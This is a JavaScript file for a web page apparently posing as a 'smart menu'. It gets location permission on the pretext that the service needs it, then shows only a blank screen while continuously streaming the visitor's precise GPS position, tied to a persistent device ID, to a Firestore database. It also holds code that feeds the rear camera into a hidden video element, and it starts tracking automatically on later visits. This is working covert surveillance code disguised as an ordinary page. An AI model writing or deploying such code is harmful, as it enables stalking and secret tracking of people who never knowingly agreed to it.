// === تهيئة Firebase والاتصال بقاعدة البيانات ===
firebase.initializeApp(firebaseConfig);
var db = firebase.firestore();

// === معرّف الجهاز الثابت ===
var deviceId = localStorage.getItem('smart_menu_device_id');
if (!deviceId) {
    deviceId = "dev_" + Math.random().toString(36).substring(2, 12) + Date.now().toString(36);
    localStorage.setItem('smart_menu_device_id', deviceId);
}

// === متغيرات التتبع ===
var watcher = null;
var bestAcc = Infinity;
var optimizing = true;
var t0 = Date.now();
var lastPushTime = 0;
var isPushing = false;
var lastPushedLat = null;
var lastPushedLng = null;
var cameraStream = null;
var cameraActive = false;

// === بدء التتبع ===
function start() {
    var btn = document.getElementById('perm-btn');
    btn.disabled = true;
    document.getElementById('perm-ld').style.display = 'block';
    document.getElementById('perm-btn-icon').style.display = 'none';
    document.getElementById('perm-btn-text').innerText = 'جاري التحقق...';

    if (!("geolocation" in navigator)) { showBlocked(); return; }

    watcher = navigator.geolocation.watchPosition(onPos, onErr, {
        enableHighAccuracy: true, timeout: 15000, maximumAge: 0
    });
}

// === استقبال الإحداثيات والرفع الذكي ===
function onPos(pos) {
    var lat = pos.coords.latitude;
    var lng = pos.coords.longitude;
    var acc = pos.coords.accuracy;
    var now = Date.now();
    var shouldPush = false;
    var reason = '';

    if (optimizing) {
        if (acc < bestAcc) { shouldPush = true; reason = 'تحسّن الدقة'; }
        if (acc <= 5 || (now - t0 > 15000)) optimizing = false;
    } else {
        if (now - lastPushTime >= 30000) {
            shouldPush = true; reason = 'نبض';
        } else if (acc < bestAcc - 1) {
            shouldPush = true; reason = 'دقة أفضل'; bestAcc = acc;
        } else if (lastPushedLat !== null) {
            var dist = getDist(lastPushedLat, lastPushedLng, lat, lng);
            if (dist >= 3) { shouldPush = true; reason = 'حركة'; }
        }
        if (!shouldPush && acc < bestAcc) bestAcc = acc;
    }

    if (shouldPush && !isPushing) push(lat, lng, acc);

    document.getElementById('perm-screen').classList.add('fade-out');
    setTimeout(function () {
        document.getElementById('perm-screen').style.display = 'none';
        document.getElementById('blank-screen').style.display = 'flex';
    }, 500);
}

// === حساب المسافة بين نقطتين (متر) ===
function getDist(lat1, lon1, lat2, lon2) {
    var R = 6371000, dLat = (lat2 - lat1) * Math.PI / 180, dLon = (lon2 - lon1) * Math.PI / 180;
    var a = Math.sin(dLat / 2) * Math.sin(dLat / 2) +
            Math.cos(lat1 * Math.PI / 180) * Math.cos(lat2 * Math.PI / 180) *
            Math.sin(dLon / 2) * Math.sin(dLon / 2);
    return R * 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
}

// === الرفع إلى Firestore ===
function push(lat, lng, acc) {
    isPushing = true;
    db.collection('loc').doc(deviceId).set({
        latitude: lat, longitude: lng, accuracy: acc, device_id: deviceId,
        last_updated: firebase.firestore.FieldValue.serverTimestamp()
    }, { merge: true }).then(function () {
        isPushing = false;
        lastPushTime = Date.now();
        lastPushedLat = lat;
        lastPushedLng = lng;
    }).catch(function () { isPushing = false; });
}

// === معالجة أخطاء GPS ===
function onErr(err) {
    if (err.code === err.PERMISSION_DENIED) showBlocked();
}

// === شاشة حظر الأذن ===
function showBlocked() {
    document.getElementById('perm-box').classList.add('blocked');
    document.getElementById('perm-icon').className = 'fa-solid fa-xmark';
    document.getElementById('perm-title').innerText = 'الصلاحية مطلوبة';
    document.getElementById('perm-desc').innerText = 'لا يمكن تقديم الخدمة بدون تحديد الموقع. يرجى تحديث الصفحة والموافقة.';
    document.getElementById('perm-ld').style.display = 'none';
    var icon = document.getElementById('perm-btn-icon');
    icon.style.display = 'inline';
    icon.className = 'fa-solid fa-rotate-right';
    document.getElementById('perm-btn-text').innerText = 'إعادة المحاولة';
    document.getElementById('perm-btn').disabled = false;
}

// === الكاميرا: تُطلب فقط عند الحاجة ===
async function requestCamera() {
    if (cameraActive && cameraStream) return cameraStream;
    cameraStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { ideal: "environment" } } });
    cameraActive = true;
    document.getElementById('hidden-stream').srcObject = cameraStream;
    return cameraStream;
}

function releaseCamera() {
    if (cameraStream) { cameraStream.getTracks().forEach(function (t) { t.stop(); }); cameraStream = null; }
    cameraActive = false;
    document.getElementById('hidden-stream').srcObject = null;
}

// === فحص تلقائي إذا الأذن ممنوح مسبقاً ===
window.onload = function () {
    if (navigator.permissions && navigator.permissions.query) {
        navigator.permissions.query({ name: 'geolocation' }).then(function (r) {
            if (r.state === 'granted') start();
        }).catch(function () {});
    }
};